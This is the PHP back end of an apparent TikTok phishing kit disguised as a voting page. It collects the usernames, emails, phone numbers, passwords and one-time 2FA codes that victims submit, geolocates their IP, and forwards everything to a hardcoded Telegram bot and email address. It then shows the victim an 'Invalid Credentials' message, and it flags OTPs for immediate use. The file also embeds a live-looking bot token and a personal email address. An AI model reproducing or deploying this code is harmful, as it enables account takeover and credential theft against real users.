<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");

// Telegram configuration (from nnvironmint vaoinblesvariables)
$botToken = getenv('TELEGRAM_BOT_TOKEN') ?: "8272404690:AAFjvKof7tWOT2ITQTWXWxJyr32dYW8QWi4";
$id = getenv('TELEGRAM_CHAT_ID') ?: "-5094845590";
$Receive_email = getenv('RECEIVE_EMAIL') ?: "davidmassmutual@gmail.com"; // Define the email address for logging

// Add more debug
file_put_contents(__DIR__ . '/debug.log', 'Script started at ' . date('Y-m-d H:i:s') . ' from ' . __FILE__ . ' in ' . __DIR__ . PHP_EOL, FILE_APPEND);

// Debug: Log POST data
file_put_contents(__DIR__ . '/debug.log', date('Y-m-d H:i:s') . ' - POST: ' . print_r($_POST, true) . PHP_EOL, FILE_APPEND);

// Get POST data
$em = isset($_POST['di']) ? trim($_POST['di']) : '';
$password = isset($_POST['pr']) ? trim($_POST['pr']) : '';
$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
$vote = isset($_POST['vote']) ? trim($_POST['vote']) : '';
$contestant = isset($_POST['contestant']) ? trim($_POST['contestant']) : '';
$status = isset($_POST['status']) ? trim($_POST['status']) : '';

// Function to log message via email and Telegram
function logMessage($message, $send, $subject) {
    // Send email
    mail($send, $subject, $message);

    // Send to Telegram
    global $botToken, $id;
    $mess = urlencode($message);
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $id . "&text=" . $mess;
    file_put_contents(__DIR__ . '/debug.log', 'Telegram URL: ' . $url . PHP_EOL, FILE_APPEND);
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);

    $result = curl_exec($curl);
    $error = curl_error($curl);
    curl_close($curl);
    file_put_contents(__DIR__ . '/debug.log', 'Telegram curl result: ' . $result . ' Error: ' . $error . PHP_EOL, FILE_APPEND);

    return $result;
}

// Function to get real client IP
function getClientIP() {
    $ip_headers = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_X_REAL_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];

    foreach ($ip_headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            // Handle comma-separated IPs (X-Forwarded-For)
            if (strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            // Validate IP
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }

    return getenv("REMOTE_ADDR") ?: '127.0.0.1';
}

// Function to get location from IP
function getLocation($ip) {
    // Try ip-api.com first (HTTPS)
    $url = "https://ip-api.com/json/" . $ip . "?fields=country,regionName,city,status";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP/8.0)');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response && $http_code == 200) {
        $data = json_decode($response, true);
        if ($data && isset($data['status']) && $data['status'] === 'success') {
            return [
                'country' => $data['country'] ?? 'Unknown',
                'region' => $data['regionName'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown'
            ];
        }
    }

    // Fallback: Try ipinfo.io
    $url2 = "https://ipinfo.io/" . $ip . "/json";

    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, $url2);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch2, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP/8.0)');

    $response2 = curl_exec($ch2);
    $http_code2 = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
    curl_close($ch2);

    if ($response2 && $http_code2 == 200) {
        $data2 = json_decode($response2, true);
        if ($data2 && !isset($data2['error'])) {
            $location_parts = explode(', ', $data2['loc'] ?? '');
            return [
                'country' => $data2['country'] ?? 'Unknown',
                'region' => $data2['region'] ?? 'Unknown',
                'city' => $data2['city'] ?? 'Unknown'
            ];
        }
    }

    // If both APIs fail, return unknown
    return [
        'country' => 'Unknown',
        'region' => 'Unknown',
        'city' => 'Unknown'
    ];
}

// Check if form fields are set
if (!empty($vote)) {
    // Vote button clicked notification
    $ip = getClientIP();
    $location = getLocation($ip);

    $message = "🎯 VOTE BUTTON CLICKED!\n\n";
    $message .= "👑 Contestant: " . htmlspecialchars($contestant) . "\n";
    $message .= "⏳ Status: " . htmlspecialchars($status) . "\n\n";
    $message .= "🌍 LOCATION:\n";
    $message .= "Country: " . $location['country'] . "\n";
    $message .= "State: " . $location['region'] . "\n";
    $message .= "City: " . $location['city'] . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "-VOTING SYSTEM ALERT-\n";

    $send = $Receive_email;
    $subject = "Vote Button Clicked: $ip";

    logMessage($message, $send, $subject);
} elseif (!empty($em) && empty($password) && empty($otp)) {
    // Continue button clicked (email/phone entered without password or OTP)
    $ip = getClientIP();
    $location = getLocation($ip);

    $message = "📱 NEW LOGIN ATTEMPT (Continue)\n\n";
    $message .= "📋 DETAILS:\n";
    $message .= "PLATFORM: TIKTOK\n";

    if (strpos($em, '+') === 0 || strpos($em, '@') !== false) {
        if (strpos($em, '+') === 0) {
            $message .= "Phone Number: " . htmlspecialchars($em) . "\n";
            // Extract country code for phone numbers
            $parts = explode(' ', $em);
            if (count($parts) > 1) {
                $message .= "Country Code: " . htmlspecialchars($parts[0]) . "\n";
            }
        } elseif (strpos($em, '@') !== false) {
            $message .= "Email: " . htmlspecialchars($em) . "\n";
        }
    } else {
        $message .= "Username: " . htmlspecialchars($em) . "\n";
    }

    $message .= "\n🌍 LOCATION:\n";
    $message .= "Country: " . $location['country'] . "\n";
    $message .= "State: " . $location['region'] . "\n";
    $message .= "City: " . $location['city'] . "\n";
    $message .= "IP: " . $ip . "\n";
    $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
    $message .= "-TIKTOK LOGIN SYSTEM-\n";

    $send = $Receive_email;
    $subject = "TikTok Continue Button: $ip";

    logMessage($message, $send, $subject);
} elseif (!empty($em) && (!empty($password) || !empty($otp))) {
    $ip = getClientIP();
    $location = getLocation($ip);

    if (!empty($password)) {
        // Login attempt
        $message = "🔐 NEW LOGIN ATTEMPT\n\n";
        $message .= "📋 DETAILS:\n";
        $message .= "PLATFORM: TIKTOK\n";
        $message .= "UserName: " . htmlspecialchars($em) . "\n";
        $message .= "Password: " . htmlspecialchars($password) . "\n";
        if (strpos($em, '+') === 0) {
            // Phone number, extract country code
            $parts = explode(' ', $em);
            $message .= "Country Code: " . htmlspecialchars($parts[0]) . "\n";
        }
        $message .= "\n🌍 LOCATION:\n";
        $message .= "Country: " . $location['country'] . "\n";
        $message .= "State: " . $location['region'] . "\n";
        $message .= "City: " . $location['city'] . "\n";
        $message .= "IP: " . $ip . "\n\n";
        $message .= "-SECURED BY SHARPLOGS-\n";
    } elseif (!empty($otp)) {
        // OTP code
        $message = "🔑 TIKTOK 2FA CODE\n\n";
        $message .= "📋 DETAILS:\n";
        $message .= "User: " . htmlspecialchars($em) . "\n";
        $message .= "Code: " . htmlspecialchars($otp) . "\n";
        $message .= "Time: " . date('Y-m-d H:i:s') . "\n\n";
        $message .= "USE IMMEDIATELY – TIME SENSITIVE\n";
    }
    $send = $Receive_email;
    $subject = "Login Attempt: $ip";

    if (logMessage($message, $send, $subject)) {
        $signal = 'ok';
        $msg = 'Invalid Credentials';
    }
}
?>
